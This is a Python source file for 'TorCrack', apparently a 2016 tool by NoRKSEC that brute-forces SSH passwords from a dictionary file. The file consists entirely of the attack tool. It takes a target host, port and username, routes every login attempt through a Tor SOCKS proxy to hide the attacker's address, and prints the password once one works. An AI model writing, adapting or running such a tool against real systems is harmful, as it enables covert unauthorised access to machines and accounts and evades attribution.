#!/usr/bin/python

#norksec torcrack - (c) 2016 no rights reserved

try:
	from tqdm import *
except:
	print(' [-] Error: requires tqdm (pip3 install tqdm)')
	os._exit(1)
try:
	from pyfiglet import Figlet
except:
	print(' [-] Error: requires PyFiglet (pip3 install pyfiglet)')
	os._exit(1)
import optparse
import os
import sys
try:
	import paramiko
except:
	print(' [-] Error: requires Paramiko (pip3 install paramiko)')
	os._exit(1)
import socket
import atexit
import requests
try:
	import socks
except:
	print(' [-] Error: requires socks/SocksiPy/PySocks (pip3 install PySocks)')
	os._exit(1)

def cls():
	os.system('cls' if os.name=='nt' else 'clear')

def intro():
	fa = Figlet(font='graffiti')
	print(fa.renderText('NoRKSEC'))
	print('TorCrack v1.0 - (c) 2016 NoRKSEC - no rights reserved\n\n')

def exit_handler():
	print('\n [~] Exiting...\n')

def ssh_connect(password, code = 0):
	paramiko.util.log_to_file("paramiko.log")
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(tgtHost, port=tgtPort, username=tgtUser, password=password)
	except paramiko.AuthenticationException:
		code = 1
	except socket.error as e:
		code = 2

	ssh.close()
	return code

def is_valid_ipv4(address):
	try:
		socket.inet_pton(socket.AF_INET, address)
	except AttributeError:
		try:
			socket.inet_aton(address)
		except socket.error:
			return False
		return address.count('.') == 3
	except socket.error:
		return False
	return True

def main():
	atexit.register(exit_handler)
	parser = optparse.OptionParser('%prog -t <target> -p <target port> -u <username> -d <dictionary/pass list> [-P tor port (default: 9050)]')
	parser.add_option('-P', dest='torPort', type='int', help='specify Tor port (optional: default 9050)')
	parser.add_option('-t', dest='tgtHost', type='string', help='specify target (required)')
	parser.add_option('-u', dest='tgtUser', type='string', help='specify username (required')
	parser.add_option('-d', dest='dictFile', type='string', help='specify dictionary file/password list (required)')
	parser.add_option('-p', dest='tgtPort', type='int', help="specify target port (required)")
	(options, args) = parser.parse_args()
	global tgtHost, tgtUser, dictFile, tgtPort, torPort
	if (options.tgtHost == None) | (options.tgtUser == None) | (options.dictFile == None) | (options.tgtPort == None):
		print('TorCrack.py - a simple Tor enabled SSH brute force attack.\n\n')
		print(parser.error('Invalid Arguments.'))
		exit(0)
	else:
		tgtUser = options.tgtUser
		dictFile = options.dictFile
		tgtPort = options.tgtPort
		if is_valid_ipv4(options.tgtHost) == True:
			tgtHost = options.tgtHost
		else:
			try:
				tgtHost = gethostbyname(options.tgtHost)
			except:
				print(" [-] Cannot resolve '%s': Unknown host" % options.tgtHost)
				exit(0)
	if (options.torPort == None):
		torPort = 9050
	else:
		torPort = options.torPort
	print('\n [+] ' + options.tgtHost + ' resolved to ' + str(tgtHost))
	print(' [+] Target locked: ' + str(tgtHost) + ':' + str(tgtPort))
	print(' [+] Tor Port set to: ' + str(torPort))
	print(' [+] Target username set to: ' + tgtUser)
	
	if not os.path.isfile(dictFile):
		print(" [-] Dictionary file does not exist.")
		os._exit(1)
	
	print(' [+] Dictionary File/Password List set to: ' + dictFile)
	lineMax = sum(1 for line in open(dictFile))
	global session
	print (' [+] Actual IP: ' + requests.get('http://icanhazip.com').text)
	socks.set_default_proxy(socks.SOCKS5, "localhost", torPort)
	socket.socket = socks.socksocket
	try:
		test = requests.get('http://icanhazip.com').text
	except:
		print(' [-] Error establishing Tor circuit. Is the port correct? Shutting down...\n')
		exit(0)
	print(' [+] Tor circuit established.') 
	print(' [+] Tor IP: ' + test)
	paramiko.client.socket.socket = socks.socksocket
	input_file = open(dictFile)
	
	for i in tqdm(input_file.readlines(), total=lineMax):
		password = i.strip('\n')
		try:
			response = ssh_connect(password)
			
			if response == 0:
				#print('Code: ' + str(response))
				print(' [*] User: ' + str(tgtUser) + ' [*] Pass Found: ' + str(password))
				os._exit(1)
			elif response == 1:
				#print('Code: ' + str(response))
				pass
			elif response == 2:
				#print('Code: ' + str(response))
				print(' [-] Connection Could Not Be Established To Address: ' + str(tgtHost) + ':' + str(tgtPort))
				os._exit(1)
		except Exception as e:
			#print('Code: error')
			print(' [-] Error: ' + e)
			os._exit(1)
	
	print(' [+] Password not found; Shutting down.')
	
if __name__ == '__main__':
	cls()
	intro()
	main()
